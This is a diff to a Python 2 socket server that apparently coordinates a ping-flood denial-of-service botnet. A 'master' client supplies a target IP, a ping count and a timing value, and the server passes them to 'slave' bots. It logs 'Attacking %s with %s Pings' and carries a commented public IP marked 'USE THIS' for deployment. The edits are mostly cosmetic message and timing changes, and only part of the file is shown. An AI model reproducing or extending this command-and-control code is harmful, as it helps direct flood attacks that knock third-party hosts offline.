@@ -1,4 +1,4 @@
-#!/usr/bin/python
+#!/usr/bin/python2
 from socket import *
 import threading
 import thread
@@ -25,34 +25,32 @@ def handler(clientsock,addr):
 			print >>sys.stderr, '\nReceived: "%s"' % data
 			if data == master:
 				ipAdd = clientsock.recv(BUFSIZ)
-				print >>sys.stderr, 'new ipaddress is "%s" ' % ipAdd
-				time.sleep(2)
+				print >>sys.stderr, 'New IP Address: "%s" ' % ipAdd
+				#time.sleep(2)
 				numPing = str(clientsock.recv(BUFSIZ))
-				print >>sys.stderr, 'number of pings is "%s"' % numPing
+				print >>sys.stderr, 'Number of Pings: "%s"' % numPing
 				ping_time = clientsock.recv(BUFSIZ)
-				clientsock.send('confirming ipaddress is "%s" ' % ipAdd)
-				clientsock.send('confirming number of pings is "%s" ' % numPing)
-				clientsock.send('confirming ping time is "%s" ' % ping_time)
+				clientsock.send('\n\nConfirmed IP Address: "%s" ' % ipAdd)
+				clientsock.send('\nConfirmed Number of Pings: "%s" ' % numPing)
+				clientsock.send('\nConfirmed Ping Time: "%s" ' % ping_time)
 				break
 			elif data == slave:
 				clientsock.send(ipAdd)
-				print >>sys.stderr, ipAdd
-				time.sleep(2)
+				#time.sleep(2)
 				clientsock.send(str(numPing))
-				print >>sys.stderr, numPing
-				time.sleep(2)
+				#time.sleep(2)
+				print >>sys.stderr, 'Attacking %s with %s Pings' % (ipAdd, numPing)
 				clientsock.send(str(ping_time))
 				break
 			else:
-				print >>sys.stderr, 'invalid access from ', clientsock
+				print >>sys.stderr, 'Invalid Access From: ', clientsock
 				break
 	print '\nWaiting For Connections'
 	clientsock.close()
 
 if __name__=='__main__':
-	#HOST = 'localhost'
+	HOST = 'localhost'
 	#HOST = '198.252.11.72'  USE THIS
-	HOST = '172.18.65.25'
 	PORT = 35000
 	BUFSIZ = 1024
 	ADDR = (HOST, PORT)
